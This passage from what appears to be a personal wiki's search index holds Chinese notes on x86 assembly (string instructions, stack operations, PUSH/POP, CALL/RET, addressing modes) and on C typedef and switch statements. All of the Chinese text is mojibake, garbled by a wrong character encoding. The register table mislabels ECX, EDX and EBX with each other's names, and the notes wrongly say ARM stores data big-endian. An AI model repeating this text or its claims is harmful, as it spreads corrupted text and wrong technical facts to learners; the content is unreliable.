BYTE PTR DS:[ESI] ä¼ é€ï¼ˆå¤åˆ¶ï¼‰å­—èŠ‚ 1 MOVSW MOVS WORD PTR ES:[EDI], WORD PTR DS:[ESI] ä¼ é€ï¼ˆå¤åˆ¶ï¼‰å­— 2 MOVSD MOVS DWORD PTR ES:[EDI], DWORD PTR DS:[ESI] ä¼ é€ï¼ˆå¤åˆ¶ï¼‰åŒå­— 4 STOSæŒ‡ä»¤ ä¿å­˜å­—ç¬¦ä¸²æ•°æ®ï¼šå°†ç´¯åŠ å™¨çš„å†…å®¹ä¿å­˜åˆ°EDIå¯»å€çš„å†…å­˜ä½ç½®ã€‚EDIæ ¹æ®æ–¹å‘æ ‡å¿—ä½çš„å€¼è‡ªå¢æˆ–è‡ªå‡ã€‚å¯ä½¿ç”¨é‡å¤å‰ç¼€ã€‚ æŒ‡ä»¤ å®Œæ•´å½¢å¼ å«ä¹‰ EDIå¢åŠ æˆ–å‡å°‘çš„æ•°å€¼ STOSB STOS BYTE PTR ES:[EDI] å°†ALçš„å€¼å‚¨å­˜åˆ°EDIæŒ‡å®šçš„å†…å­˜åœ°å€ 1 STOSW STOS WORD PTR ES:[EDI] å°†AXçš„å€¼å‚¨å­˜åˆ°EDIæŒ‡å®šçš„å†…å­˜åœ°å€ 2 STOSD STOS DWORD PTR ES:[EDI] å°†EAXçš„å€¼å‚¨å­˜åˆ°EDIæŒ‡å®šçš„å†…å­˜åœ°å€ 4 æ–¹å‘æ ‡å¿—ä½DF å¯ç”¨CLDå’ŒSTDæŒ‡ä»¤æ˜¾å¼ä¿®æ”¹æ–¹å‘æ ‡å¿—ä½ã€‚ 12CLD;æ–¹å‘æ ‡å¿—ä½æ¸…é›¶ï¼ˆæ­£å‘ï¼‰STD;æ–¹å‘æ ‡å¿—ä½ç½®1ï¼ˆåå‘ï¼‰ æ–¹å‘æ ‡å¿—ä½çš„å€¼ å¯¹ESIå’ŒEDIçš„å½±å“ åœ°å€é¡ºåº 0 å¢åŠ  ä½åˆ°é«˜ 1 å‡å°‘ é«˜åˆ°ä½ REPæŒ‡ä»¤ é‡å¤å‰ç¼€,REP ECX&gt;0æ—¶é‡å¤ã€‚æ¯æ‰§è¡Œä¸€æ¬¡ï¼ŒECXå¯„å­˜å™¨ä¸­çš„å€¼å‡ä¸€ï¼Œç›´è‡³ä¸ºé›¶ã€‚ 123456REP MOVSBREP MOVSWREP MOVSDREP STOSBREP STOSWREP STOSD ç¤ºä¾‹ï¼šå¤åˆ¶å­—ç¬¦ä¸² ä¸‹é¢çš„ä¾‹å­ä¸­ï¼ŒMOVSBä»string1ä¼ é€10ä¸ªå­—èŠ‚åˆ°string2ã€‚é‡å¤å‰ç¼€åœ¨æ‰§è¡ŒMOVSBæŒ‡ä»¤ä¹‹å‰ï¼Œé¦–å…ˆæµ‹è¯•ECXæ˜¯å¦å¤§äº0ã€‚è‹¥ECX=0ï¼ŒMOVSBæŒ‡ä»¤è¢«å¿½ç•¥ï¼Œæ§åˆ¶ä¼ é€’åˆ°ç¨‹åºçš„ä¸‹ä¸€è¡Œä»£ç ï¼›è‹¥ECX&gt;0ï¼Œåˆ™ECXå‡1å¹¶é‡å¤æ‰§è¡ŒMOVSBæŒ‡ä»¤ï¼š 12345cld ;æ¸…é™¤æ–¹å‘æ ‡å¿—ä½mov esi, OFFSET Stringl ;ESIæŒ‡å‘æºä¸²mov edi, OFFSET string2 ;EDIæ‰§è¡Œç›®çš„ä¸²mov ecx,10 ;è®¡æ•°å™¨èµ‹å€¼ä¸º10rep movsb ;ä¼ é€10ä¸ªå­—èŠ‚ å †æ ˆ è¿›ç¨‹çº¿æ€§åœ°å€ç©ºé—´4GBä¸­ä¸€å—ç‰¹æ®Šçš„å†…å­˜ã€‚ å †æ ˆä½¿ç”¨ï¼Œç”±é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘ä½¿ç”¨ã€‚ ç”¨DTDebugéšä¾¿æ‰“å¼€ä¸€ä¸ªç¨‹åºï¼ŒæŸ¥çœ‹fs.baseçš„å€¼ï¼Œç„¶ååœ¨å†…å­˜çª—å£è¾“å…¥dd 3003000æŸ¥çœ‹ï¼Œå°±èƒ½çœ‹åˆ°å †æ ˆçš„åœ°å€èŒƒå›´ æ ˆé¡¶ï¼š02F30000ã€‚æ ˆåº•ï¼š02F1F000ã€‚å°†å †æ ˆçª—å£æ‹‰åˆ°é¡¶éƒ¨å’Œåº•éƒ¨ï¼Œå¯ä»¥è¯å®ã€‚02F2FFFCå 4å­—èŠ‚ï¼Œ+4ï¼Œå°±æ˜¯02F30000 ESPæ ˆé¡¶æŒ‡é’ˆæ€»æ˜¯æŒ‡å‘æœ€åå‹å…¥å †æ ˆçš„æ•°æ®é¡¹ã€‚EBPæ ˆåº•æŒ‡é’ˆè¡¨ç¤ºå½“å‰ä½¿ç”¨å †æ ˆçš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚ ESP-EBPï¼Œå°±çŸ¥é“è¿™ä¸ªå †æ ˆä½¿ç”¨äº†å¤šå°‘å†…å­˜ç©ºé—´ã€‚ è¦è¯»å–å †æ ˆä¸­çš„æŸä¸ªæ•°æ®æ—¶ï¼Œæ—¢å¯ä»¥é€šè¿‡ESPåŠ åç§»ï¼Œä¹Ÿå¯ä»¥é€šè¿‡EBPåŠ åç§»çš„æ–¹å¼æ¥å¯»å€ã€‚ debugç¼–è¯‘çš„exeä¸ºEBPå¯»å€ï¼Œreleaseçš„ä¸ºESPå¯»å€ã€‚ å †æ ˆåº”ç”¨ è¿è¡Œæ—¶å †æ ˆåœ¨ç¨‹åºä¸­æœ‰ä¸€äº›é‡è¦ç”¨é€”: å½“å¯„å­˜å™¨ç”¨äºå¤šä¸ªç›®çš„æ—¶,å †æ ˆå¯ä»¥ä½œä¸ºå¯„å­˜å™¨çš„ä¸€ä¸ªæ–¹ä¾¿çš„ä¸´æ—¶ä¿å­˜åŒºã€‚åœ¨å¯„å­˜å™¨è¢«ä¿®æ”¹å,è¿˜å¯ä»¥æ¢å¤å…¶åˆå§‹å€¼ã€‚ æ‰§è¡ŒCALLæŒ‡ä»¤æ—¶,CPUåœ¨å †æ ˆä¸­ä¿å­˜å½“å‰è¿‡ç¨‹çš„è¿”å›åœ°å€ã€‚ è°ƒç”¨è¿‡ç¨‹æ—¶,è¾“å…¥æ•°å€¼ä¹Ÿè¢«ç§°ä¸ºå‚æ•°ï¼Œé€šè¿‡å°†å…¶å‹å…¥å †æ ˆå®ç°å‚æ•°ä¼ é€’ã€‚ å †æ ˆä¹Ÿä¸ºè¿‡ç¨‹å±€éƒ¨å˜é‡æä¾›äº†ä¸´æ—¶å­˜å‚¨åŒºåŸŸã€‚ PUSH å…ˆå‡å°‘ESPçš„å€¼ï¼Œå†å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆã€‚ æ“ä½œæ•°æ˜¯16ä½çš„ï¼Œåˆ™ESPå‡2 æ“ä½œæ•°æ˜¯32ä½çš„ï¼Œåˆ™ESPå‡4 1234;ä¸èƒ½push al ;ä¸èƒ½push 8ä½çš„å¯„å­˜å™¨/å†…å­˜PUSH reg/mem16PUSH reg/mem32PUSH imm8/imm16/imm32\t;ç«‹å³æ•°éƒ½æ˜¯-4å­—èŠ‚ ç­‰ä»·æŒ‡ä»¤ å‹æ ˆåšäº†ä¸¤ä»¶äº‹ï¼š æŠ¬æ ˆ å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆ æŠ¬æ ˆçš„ç­‰ä»·æŒ‡ä»¤ï¼š sub esp,0x4 lea esp,dword ptr ss:[esp-4] å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆçš„ç­‰ä»·æŒ‡ä»¤ï¼š mov dword ptr ss:[esp-4],0xAAAAAAAAï¼Œç„¶åæŠ¬æ ˆ å…ˆæŠ¬æ ˆåï¼Œmov dword ptr ss:[esp],0xAAAAAAAA ç»„åˆä¸€ä¸‹ï¼Œå¦‚æœæ˜¯å…ˆæŠ¬æ ˆï¼Œç„¶åå°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆ ç­‰ä»·æŒ‡ä»¤1ï¼š 12sub esp,0x4mov dword ptr ss:[esp],0xAAAAAAAA ç­‰ä»·æŒ‡ä»¤2ï¼š 12lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],0xAAAAAAAA å¦‚æœæ˜¯å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°å †æ ˆï¼Œç„¶åå†æŠ¬æ ˆ ç­‰ä»·æŒ‡ä»¤1ï¼š 12mov dword ptr ss:[esp-4],0xAAAAAAAAsub esp,0x4 ç­‰ä»·æŒ‡ä»¤2ï¼š 12mov dword ptr ss:[esp-4],0xAAAAAAAAlea esp,dword ptr ss:[esp-4] POP å…ˆæŠŠESPæŒ‡å‘çš„å †æ ˆå…ƒç´ å†…å®¹å¤åˆ¶åˆ°ç›®çš„æ“ä½œæ•°ä¸­ï¼Œå†å¢åŠ ESPçš„å€¼ã€‚ æ“ä½œæ•°æ˜¯16ä½çš„ï¼Œåˆ™ESPåŠ 2 æ“ä½œæ•°æ˜¯32ä½çš„ï¼Œåˆ™ESPåŠ 4 12POP reg/mem16POP reg/mem32 ä¸éœ€è¦è¿™ä¸ªæ•°æ®æ—¶ï¼Œç›´æ¥ä¸‹é™æ ˆé¡¶æŒ‡é’ˆESP 1add esp, 0x4 1lea esp,dword ptr ss:[esp+4] ä½œä¸š ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špush esp ç­”æ¡ˆæ–¹å¼ä¸€ï¼š12lea eax,dword ptr ss:[esp]push eax ;åˆ†æˆä¸¤æ­¥ï¼Œç”¨ç­‰ä»·æŒ‡ä»¤ä¹Ÿå¯ä»¥ï¼Œæˆ‘è¿™é‡Œå·æ‡’äº†æ–¹å¼äºŒï¼š12mov dword ptr ss:[esp-4],esplea esp,dword ptr ss:[esp-4] ;sub exp,0x4ä¹Ÿå¯ä»¥ ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špop esp ç­”æ¡ˆå¦‚æœæ‰§è¡Œpop espï¼Œå®ƒåšäº†ä¸¤ä»¶äº‹ï¼šé™æ ˆï¼Œespçš„å€¼æ˜¯å †æ ˆé‡Œå¼¹å‡ºæ¥çš„å€¼ä¸è¿‡å…¶å®espå€¼è¢«æ”¹äº†ï¼Œå¹³æ ˆæ“ä½œå…¶å®æ²¡å•¥æ„ä¹‰ï¼Œç®—æ˜¯é¢˜ç›®çš„å±€é™æ€§å§æ–¹å¼ä¸€ï¼š12add esp,4mov esp,dword ptr ss:[esp-4]æ–¹å¼äºŒï¼š123mov eax,dword ptr ss:[esp]add esp,4mov esp,eax PUSHAD pushadæŒ‡ä»¤æŒ‰ç…§EAXï¼ŒECXï¼ŒEDXï¼ŒEBXï¼ŒESPï¼ˆæ‰§è¡ŒPUSHADä¹‹å‰çš„å€¼ï¼‰ï¼ŒEBPï¼ŒESIå’ŒEDIçš„é¡ºåºï¼Œå°†æ‰€æœ‰32ä½é€šç”¨å¯„å­˜å™¨å‹å…¥å †æ ˆã€‚ popadæŒ‡ä»¤æŒ‰ç›¸åé¡ºåºå°†å¯„å­˜å™¨å¼¹å‡ºå †æ ˆã€‚ ä¸Šè¾¹å¯„å­˜å™¨çš„é¡ºåºå°±æ˜¯ä¹‹å‰æ–‡ç« å†™çš„è¦è®°ä½çš„ç¼–å·é¡ºåºï¼Œä¹Ÿæ˜¯ODä»ä¸Šå¾€ä¸‹æ˜¾ç¤ºçš„é¡ºåºã€‚ ä¸ä¹‹ç›¸ä¼¼ï¼ŒPUSHAæŒ‡ä»¤æŒ‰åºï¼ˆAXã€CXã€DXã€BXã€SPã€BPã€SIå’ŒDI)å°†16ä½é€šç”¨å¯„å­˜å™¨å‹å…¥å †æ ˆã€‚POPAæŒ‡ä»¤æŒ‰ç…§ç›¸åé¡ºåºå°†åŒæ ·çš„å¯„å­˜å™¨å¼¹å‡ºå †æ ˆã€‚åœ¨16ä½æ¨¡å¼ä¸‹ï¼Œåªèƒ½ä½¿ç”¨PUSHAå’ŒPOPAæŒ‡ä»¤ã€‚ PUSHFD PUSHFDæŒ‡ä»¤æŠŠ32ä½EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆï¼Œè€ŒPOPFDæŒ‡ä»¤åˆ™æŠŠæ ˆé¡¶å•å…ƒå†…å®¹å¼¹å‡ºåˆ°EFLAGSå¯„å­˜å™¨ã€‚ ä¿®æ”¹EIPçš„æŒ‡ä»¤ JMP ä¿®æ”¹EIPçš„å€¼ä¸ºæŒ‡å®šçš„æŒ‡ä»¤åœ°å€. æ— æ¡ä»¶è·³è½¬åˆ°ç›®æ ‡åœ°å€ã€‚æµ·å“¥è¯´è·Ÿè¿™ä¸ªæ²¡å…³ç³»ï¼Œè®°ä½ä¿®æ”¹eipå°±è¡Œï¼Œç„¶åCPUæ ¹æ®eipå†³å®šä¸‹ä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ 1JMP å¯„å­˜å™¨/ç«‹å³æ•°/å†…å­˜ åœ¨å«ä¹‰ä¸Šå¥½ä¼¼ï¼šmov IP,ax.ï¼ˆå¹¶ä¸æ˜¯è¯´çœŸæœ‰mov IP,axè¿™æ ·çš„æŒ‡ä»¤ï¼Œè€Œæ˜¯ç”¨movæŒ‡ä»¤çš„è¯­æ³•æ¥è¯´æ˜jmpæŒ‡ä»¤çš„åŠŸèƒ½ï¼‰ã€‚ CALL ä¸JMPå”¯ä¸€çš„åŒºåˆ«ï¼šåœ¨å †æ ˆä¸­å­˜å‚¨callæŒ‡ä»¤çš„ä¸‹ä¸€è¡Œåœ°å€ã€‚ CALLæŒ‡ä»¤å°†å…¶è¿”å›åœ°å€å‹å…¥å †æ ˆï¼Œå†æŠŠè¢«è°ƒç”¨è¿‡ç¨‹çš„åœ°å€å¤åˆ¶åˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚å½“è¿‡ç¨‹å‡†å¤‡è¿”å›æ—¶ï¼Œå®ƒçš„RETæŒ‡ä»¤ä»å †æ ˆæŠŠè¿”å›åœ°å€å¼¹å›åˆ°æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚ 1CALL å¯„å­˜å™¨/ç«‹å³æ•°/å†…å­˜ åœ¨å«ä¹‰ä¸Šå¥½ä¼¼ï¼š 12push åœ°å€B ;å½“å‰eipåœ°å€+æŒ‡ä»¤é•¿åº¦=ä¸‹ä¸€æ¡è¦æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€MOV EIP,åœ°å€A/å¯„å­˜å™¨ RET 1RET åœ¨å«ä¹‰ä¸Šå¥½ä¼¼ï¼š 1234add esp,4mov eip,[esp-4] ;æˆ–LEA ESP,[ESP+4];æˆ–pop eip ï¼ˆå¹¶ä¸æ˜¯è¯´çœŸæœ‰mov IP,axè¿™æ ·çš„æŒ‡ä»¤ï¼Œè€Œæ˜¯ç”¨movæŒ‡ä»¤çš„è¯­æ³•æ¥è¯´æ˜retä¿®æ”¹eipçš„åŠŸèƒ½ï¼‰ã€‚"},{"title":"é€šç”¨å¯„å­˜å™¨_å†…å­˜è¯»å†™","path":"/wiki/Assembly_Language/é€šç”¨å¯„å­˜å™¨_å†…å­˜è¯»å†™.html","content":"é€šç”¨å¯„å­˜å™¨ å¯„å­˜å™¨ åå­— ç”¨é€” ç¼–å· æ•°æ®å­˜å‚¨èŒƒå›´ EAX Extended Accumulatorï¼ˆæ‰©å±•ç´¯åŠ å™¨ï¼‰ ç´¯åŠ å™¨ 0 0 - 0xFFFFFFFF ECX Extended Baseï¼ˆæ‰©å±•åŸºå€ï¼‰ è®¡æ•° 1 0 - 0xFFFFFFFF EDX Extended Counterï¼ˆæ‰©å±•è®¡æ•°å™¨ï¼‰ I/OæŒ‡é’ˆ 2 0 - 0xFFFFFFFF EBX Extended Dataï¼ˆæ‰©å±•æ•°æ®ï¼‰ DSæ®µçš„æ•°æ®æŒ‡é’ˆ 3 0 - 0xFFFFFFFF ESP Extended Stack Pointerï¼ˆæ‰©å±•å †æ ˆæŒ‡é’ˆï¼‰ å †æ ˆæŒ‡é’ˆ 4 0 - 0xFFFFFFFF EBP Extended Base Pointerï¼ˆæ‰©å±•åŸºå€æŒ‡é’ˆï¼‰ SSæ®µçš„æ•°æ®æŒ‡é’ˆ 5 0 - 0xFFFFFFFF ESI Extended Source Indexï¼ˆæ‰©å±•æºç´¢å¼•ï¼‰ å­—ç¬¦ä¸²æ“ä½œçš„æºæŒ‡é’ˆï¼›SSæ®µçš„æ•°æ®æŒ‡é’ˆ 6 0 - 0xFFFFFFFF EDI Extended Destination Indexï¼ˆæ‰©å±•ç›®çš„ç´¢å¼•ï¼‰ å­—ç¬¦ä¸²æ“ä½œçš„ç›®æ ‡æŒ‡é’ˆï¼›ESæ®µçš„æ•°æ®æŒ‡é’ˆ 7 0 - 0xFFFFFFFF æŒ‰ç¼–å·é¡ºåºè®°ä½å¯„å­˜å™¨ï¼ŒEAX-0ï¼ŒECX-1ï¼Œâ€¦ ç”¨é€”åªæ˜¯å®˜æ–¹è¯´æ˜åŠå»ºè®®ä½¿ç”¨çš„æ–¹å¼ï¼Œå®é™…ä¸Šç¨‹åºå‘˜æ¸…æ¥šè‡ªå·±æ€ä¹ˆç”¨å°±è¡Œ EAXã€ECXã€EDXã€EBXçš„16ä½ï¼Œé«˜8ä½ï¼Œä½8ä½å¯å•ç‹¬ä½¿ç”¨ 32ä½ 16ä½ 8ä½ EAX AX AHã€AL ECX CX CHã€CL EDX DX DHã€DL EBX BX BHã€BL ESP SP EBP BP ESI SI EDI DI å†…å­˜ è¿™é‡Œçš„å†…å­˜æ˜¯æŒ‡è¿›ç¨‹çš„çº¿æ€§åœ°å€ç©ºé—´ï¼Œè€Œä¸æ˜¯ç¡¬ä»¶çš„å†…å­˜æ¡ç©ºé—´ã€‚ åœ¨å†…å­˜å­˜å‚¨ä¸­ï¼Œå†…å­˜å•å…ƒæ˜¯å­—èŠ‚å•å…ƒï¼ˆä¸€ä¸ªå•å…ƒå­˜æ”¾ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå‡å¦‚1ä¸ªå­˜å‚¨å™¨æœ‰128ä¸ªå­˜å‚¨å•å…ƒï¼Œç¼–å·0~127ï¼Œè¿™ä¸ªç¼–å·ç§°ä¸ºå†…å­˜åœ°å€ã€‚æ¯ä¸ªå†…å­˜åœ°å€ï¼ˆç¼–å·ï¼‰å­˜å‚¨1ä¸ªå­—èŠ‚ï¼ˆ8ä½ï¼‰ã€‚ å†…å­˜åœ°å€ç©ºé—´ç”±CPUåœ°å€æ€»çº¿å®½åº¦å†³å®šï¼Œ80386CPUçš„åœ°å€æ€»çº¿å®½åº¦ä¸º32ã€‚ å¯ä»¥ä¼ é€232ä¸ªä¸åŒçš„åœ°å€ä¿¡æ¯ï¼ˆå¤§å°ä»0è‡³232-1ï¼‰ï¼Œå³å¯ä»¥å®šä½232ä¸ªå†…å­˜å•å…ƒï¼Œå†…å­˜åœ°å€ç¼–å·èŒƒå›´ï¼š0-0xFFFFFFFF æœ‰0xFFFFFFFF+1ä¸ªå­˜å‚¨å•å…ƒï¼ˆå†…å­˜åœ°å€0ä¹Ÿç®—ä¸€ä¸ªå­˜å‚¨å•å…ƒï¼‰ï¼Œèƒ½å­˜å‚¨(0xFFFFFFFF+1)Ã—8ä¸ªä½ï¼Œ/8=0x100000000ä¸ªå­—èŠ‚ï¼Œ/1024/1024/1024=4GBã€‚ æˆ–ç›´æ¥232=4GB è¦å®Œæ•´æè¿°ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œéœ€è¦ä¸¤ä¸ªä¿¡æ¯ï¼š å†…å­˜å•å…ƒçš„åœ°å€ å†…å­˜å•å…ƒçš„é•¿åº¦ï¼ˆç±»å‹ï¼‰ å¯»å€æ–¹å¼ å½“æ•°æ®å­˜æ”¾åœ¨å†…å­˜ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¤šç§æ–¹å¼æ¥ç»™å®šè¿™ä¸ªå†…å­˜å•å…ƒçš„åç§»åœ°å€ï¼Œè¿™ç§å®šä½å†…å­˜å•å…ƒçš„æ–¹æ³•ä¸€èˆ¬è¢«ç§°ä¸ºå¯»å€æ–¹å¼ã€‚æœ‰5ç§ï¼š å½¢å¼ä¸€ï¼šç«‹å³æ•° ç›´æ¥å¯»å€ 12345678// è¯»å–å†…å­˜çš„å€¼mov eax, dword ptr ds:[0x13FFC4] // å‘å†…å­˜ä¸­å†™å…¥æ•°æ®mov dword ptr ds:[0x13FFC4], eax// è·å–å†…å­˜ç¼–å·lea eax,dword ptr ds:[0x13FFC4] å½¢å¼äºŒï¼š[reg] regè¡¨ç¤ºå¯„å­˜å™¨ï¼Œå¯ä»¥æ˜¯8ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­çš„ä»»æ„ä¸€ä¸ª å¯„å­˜å™¨é—´æ¥å¯»å€ 12345678910// è¯»å–å†…å­˜çš„å€¼mov ecx, 0x13FFD0mov eax, dword ptr ds:[ecx] // å‘å†…å­˜ä¸­å†™å…¥æ•°æ®mov edx, 0x13FFD8mov dword ptr ds:[edx], 0x87654321// è·å–å†…å­˜ç¼–å·lea eax, dword ptr ds:[edx] å½¢å¼ä¸‰ï¼š[reg+ç«‹å³æ•°] å¯„å­˜å™¨ç›¸å¯¹å¯»å€ 12345678910// è¯»å–å†…å­˜çš„å€¼mov ecx, 0x13FFD0mov eax, dword ptr ds:[ecx+4] // å‘å†…å­˜ä¸­å†™å…¥æ•°æ®mov edx, 0x13FFD8mov dword ptr ds:[edx+0xC], 0x87654321// è·å–å†…å­˜ç¼–å·lea eax,dword ptr ds:[edx+4] å½¢å¼å››ï¼š[reg+reg*{1,2,4,8}] åŸºå€å˜å€å¯»å€ 1234567891011121314// è¯»å–å†…å­˜çš„å€¼mov eax, 0x13FFC4mov ecx, 0x2mov edx, dword ptr ds:[eax+eax*4] // å‘å†…å­˜ä¸­å†™å…¥æ•°æ®mov eax, 0x13FFC4mov ecx, 0x2mov dword ptr ds:[eax+eax*4], 0x87654321// è·å–å†…å­˜ç¼–å·lea eax,dword ptr ds:[eax+ecx*4] å½¢å¼äº”ï¼š[reg+reg*{1,2,4,8}+ç«‹å³æ•°] ç›¸å¯¹åŸºå€å˜å€å¯»å€ 1234567891011121314// è¯»å–å†…å­˜çš„å€¼mov eax, 0x13FFC4 mov ecx, 0x2mov edx, dword ptr ds:[eax+ecx*4+4] // å‘å†…å­˜ä¸­å†™å…¥æ•°æ®mov eax, 0x13FFC4mov ecx, 0x2mov dword ptr ds:[eax+ecx*4+4], 0x87654321// è·å–å†…å­˜ç¼–å·lea eax,dword ptr ds:[eax+ecx*4+2] å­˜å‚¨æ–¹å¼ å¤§ç«¯æ¨¡å¼ï¼šæ•°æ®é«˜ä½å­˜å‚¨åœ¨ä½ä½åœ°å€ä¸­ï¼Œæ•°æ®ä½ä½å­˜å‚¨åœ¨é«˜ä½åœ°å€ä¸­ï¼› å°ç«¯æ¨¡å¼ï¼šæ•°æ®ä½ä½å­˜å‚¨åœ¨ä½ä½åœ°å€ä¸­ï¼Œæ•°æ®é«˜ä½å­˜å‚¨åœ¨é«˜ä½åœ°å€ä¸­ã€‚ æ¯”å¦‚æœ‰1ä¸ªæ•°æ®ï¼Œ0x1A2Bï¼Œ1Aæ˜¯è¿™ä¸ªæ•°æ®çš„é«˜ä½ï¼Œ2Bæ˜¯ä½ä½ï¼ŒæŒ‰å­—èŠ‚åˆ’åˆ†çš„ã€‚æ¯”å¦‚æœ‰2ä¸ªåœ°å€ï¼Œ0x00000000ï¼Œå’Œ0x00000001ï¼Œ0x00000000æ˜¯ä½åœ°å€ï¼Œ0x00000001æ˜¯é«˜åœ°å€ã€‚ 1mov word ptr ds:[0x00000000], 0x1A2B å¦‚æœæ˜¯å¤§ç«¯æ¨¡å¼å­˜å‚¨ï¼š å†…å­˜åœ°å€ å†…å­˜ä¸­çš„å€¼ 0x00000000 1A 0x00000001 2B â€¦ 0xFFFFFFFF å¦‚æœæ˜¯å°ç«¯æ¨¡å¼å­˜å‚¨ï¼š å†…å­˜åœ°å€ å†…å­˜ä¸­çš„å€¼ 0x00000000 2B 0x00000001 1A â€¦ 0xFFFFFFFF åœ¨80x86å¤„ç†å™¨ä¸Šï¼Œç»å¤§éƒ¨åˆ†çš„åº”ç”¨æ•°æ®å­˜å‚¨éƒ½æ˜¯é‡‡ç”¨å°ç«¯æ¨¡å¼ï¼›åœ¨ARMä¸Šåˆ™æ˜¯å¤§ç«¯æ¨¡å¼ã€‚ ã€Šæ±‡ç¼–è¯­è¨€-ç‹çˆ½ã€‹ å­—å•å…ƒçš„æ¦‚å¿µï¼šå­˜æ”¾ä¸€ä¸ªå­—å‹æ•°æ®ï¼ˆ16ä½ï¼‰çš„å†…å­˜å•å…ƒï¼Œç”±ä¸¤ä¸ªåœ°å€è¿ç»­çš„å†…å­˜å•å…ƒç»„æˆã€‚é«˜åœ°å€å†…å­˜å•å…ƒä¸­å­˜æ”¾å­—å‹æ•°æ®çš„é«˜ä½åœ°å€ï¼Œä½åœ°å€å†…å­˜å•å…ƒä¸­å­˜æ”¾å­—å‹æ•°æ®çš„ä½ä½åœ°å€ã€‚ æˆ‘ä»¬å°†èµ·å§‹åœ°å€ä¸ºNçš„å­—å•å…ƒç®€ç§°ä¸ºNåœ°å€å­—å•å…ƒã€‚æ¯”å¦‚ä¸€ä¸ªå­—å•å…ƒç”±2ã€3ä¸¤ä¸ªå†…å­˜å•å…ƒç»„æˆï¼Œåˆ™è¿™ä¸ªå­—å•å…ƒçš„èµ·å§‹åœ°å€ä¸º2ï¼Œæˆ‘ä»¬å¯ä»¥è¯´è¿™æ˜¯2åœ°å€å­—å•å…ƒã€‚"},{"title":"typedef","path":"/wiki/C/typedef.html","content":"åˆ©ç”¨typedefå¯ä»¥ä¸ºæŸä¸€ç±»å‹è‡ªå®šä¹‰åç§°ã€‚ ç®€å•ä¸€äº›çš„å£°æ˜ å¯¹å·²æœ‰ç±»å‹å®šä¹‰åˆ«å 123typedef unsigned char BYTE; typedef unsigned short WORD; typedef unsigned int DWORD; typedefç”¨äºç»“æ„ 12345678910typedef struct complex&#123; float real; float imag;&#125;COMPLEX;//éšåå°±å¯ä»¥ç”¨COMPLEXæ¥å£°æ˜ç»“æ„ä½“å˜é‡COMPLEX a;//å½“ç„¶ï¼ŒåŸæœ‰çš„ä¹Ÿèƒ½ç”¨struct complex b; ç”¨typedefæ¥å‘½åä¸€ä¸ªç»“æ„ç±»å‹æ—¶ï¼Œå¯ä»¥çœç•¥è¯¥ç»“æ„çš„æ ‡ç­¾ 12345typedef struct&#123; double x; double y;&#125;rect; 123456789101112131415rect r1 = &#123;3.0, 6.0&#125;;rect r2;// ä»¥ä¸Šä»£ç å°†è¢«ç¿»è¯‘æˆstruct&#123; double x; double y;&#125;r1 = &#123;3.0, 6.0&#125;;struct&#123; double x; double y;&#125;r2; å¤æ‚ä¸€äº›çš„å£°æ˜ ä¸€ç»´æ•°ç»„ç±»å‹çš„å®šä¹‰æ ¼å¼ 1234567891011121314typedef int vector[10]; int main(int argc, char* argv[]) &#123; vector v; v[0] = 1; v[1] = 2; v[2] = 3; v[3] = 4; v[4] = 5; return 0; &#125; äºŒç»´æ•°ç»„ç±»å‹çš„å®šä¹‰æ ¼å¼ 123456789101112131415161718typedef int matrix[5][5]; typedef int nameTable[5][5][5]; int main(int argc, char* argv[]) &#123; matrix v; nameTable n; v[0][0] = 1; v[0][1] = 2; v[0][2] = 3; v[0][3] = 4; v[0][4] = 5; n[0][0][0] = 1; return 0; &#125; å‡½æ•°æŒ‡é’ˆ 1typedef int (*Fun)(int,int); è¿™ä¸ªä¸æ˜¯å˜é‡çš„å£°æ˜ï¼Œè€Œæ˜¯ä¸ºå‡½æ•°æŒ‡é’ˆèµ·ä¸ªåˆ«åï¼šFunï¼Œå®ƒæ˜¯å‡½æ•°æŒ‡é’ˆç±»å‹ 1Fun p; è¿™ä¸ªæ‰æ˜¯å˜é‡çš„å£°æ˜ï¼Œpæ˜¯å˜é‡ï¼ŒFunæ˜¯ç±»å‹"},{"title":"Switchè¯­å¥","path":"/wiki/C/Switchè¯­å¥.html","content":"æ­£å‘ 12345678910111213141516switch(è¡¨è¾¾å¼)&#123; case å¸¸é‡è¡¨è¾¾å¼1: è¯­å¥; break; case å¸¸é‡è¡¨è¾¾å¼: è¯­å¥; break; case å¸¸é‡è¡¨è¾¾å¼: è¯­å¥; break; ...... default: è¯­å¥; break;&#125; è¡¨è¾¾å¼ç»“æœä¸èƒ½æ˜¯æµ®ç‚¹æ•° caseåçš„å€¼å¿…é¡»æ˜¯å¸¸é‡ caseåçš„å¸¸é‡ä¸èƒ½ä¸€æ · break breakçš„ä½œç”¨æ˜¯è·³åˆ°switchè¯­å¥å—çš„æœ«å°¾ã€‚å½“æ»¡è¶³å…¶ä¸­ä¸€ä¸ªcaseï¼Œä¾¿ä¼šæ‰§è¡Œé‚£ä¸ªcaseé‡Œçš„è¯­å¥ã€‚å¦‚æœæ²¡æœ‰breakï¼Œå°±ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ ä¾‹ case 1ä¸æˆç«‹ï¼Œå¾€ä¸‹æ¥ç€åˆ¤æ–­ã€‚case 2æˆç«‹ï¼Œæ‰§è¡Œï¼Œå› ä¸ºæ²¡æœ‰breakï¼Œæ¥ç€å¾€ä¸‹èµ°ã€‚æ­¤åä¸ä¼šå†å°†2å’Œ3æ¯”è¾ƒï¼Œè€Œæ˜¯æ‰§è¡Œprintf(&quot;C 